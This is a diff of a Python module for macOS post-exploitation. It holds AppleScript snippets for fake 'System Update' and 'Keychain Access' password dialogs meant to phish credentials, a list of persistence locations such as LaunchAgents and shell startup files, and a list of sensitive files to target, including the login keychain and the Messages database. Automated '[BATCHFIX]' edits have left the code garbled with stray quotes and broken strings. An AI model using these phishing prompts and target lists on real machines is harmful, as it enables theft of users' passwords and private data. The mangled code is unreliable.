@@ -12,7 +12,10 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-from typing import List, Dict
+try:
+    from typing import List, Dict
+except ImportError:
+    from typing import List, Dict
 
 
 
@@ -22,23 +25,29 @@ class MacOSIntelligence:
 #     pass  # [BATCHFIX] inserted for empty class
 """"Intelligence engine for macOS-specific enumeration and post-exploitation.#     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     def get_phishing_scripts() -> Dict[str, str]:"AppleScript snippets for credential phishing.        return {
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#             "system_update_phish": ("                'display dialog "System Update requires your password to continue." '"'                'default answer " with title "System Update" with icon caution with hidden answer'"'            ),
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#             "system_update_phish": ("                'display dialog "System Update requires your password to continue." '"'                'default answer " with title "System Update" with icon caution with hidden answer'"'            ),
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#             "keychain_access_phish": ("                'display dialog "Keychain Access wants to use the \\"login\\" keychain. '"'                'Please enter the keychain password." default answer " with title "Keychain Access" '"'# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#             "keychain_access_phish": ("                'display dialog "Keychain Access wants to use the \\"login\\" keychain. '"'                'Please enter the keychain password." default answer " with title "Keychain Access" '"'# [BATCHFIX] Commented metadata/non-Python
 """                 "with icon caution with hidden answer"  # [BATCHFIX] closed string"            ),
         }
 
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     def get_persistence_paths() -> List[str]:"Common macOS persistence locations.        return [
             "~/Library/LaunchAgents","            "/Library/LaunchAgents","            "/Library/LaunchDaemons","            "/System/Library/LaunchAgents","            "/System/Library/LaunchDaemons","            "~/.zshrc","            "~/.bash_profile","            "~/Library/Application Support/com.apple.backgroundtaskmanagementagent","        ]
 
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     def get_sensitive_files() -> List[str]:"Paths to sensitive data on macOS.# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unterminated string""""#        " return ["  # [BATCHFIX] closed string"            "~/Library/Keychains/login.keychain-db","            "~/Library/Application Support/com.apple.spotlight/index.db","            "~/Library/Safari/History.db","            "~/Library/Safari/Bookmarks.plist","            "~/Library/Messages/chat.db","        ]
+""" [BATCHFIX] Commented unterminated string""""
+#        " return ["  # [BATCHFIX] closed string"            "~/Library/Keychains/login.keychain-db","            "~/Library/Application Support/com.apple.spotlight/index.db","            "~/Library/Safari/History.db","            "~/Library/Safari/Bookmarks.plist","            "~/Library/Messages/chat.db","        ]
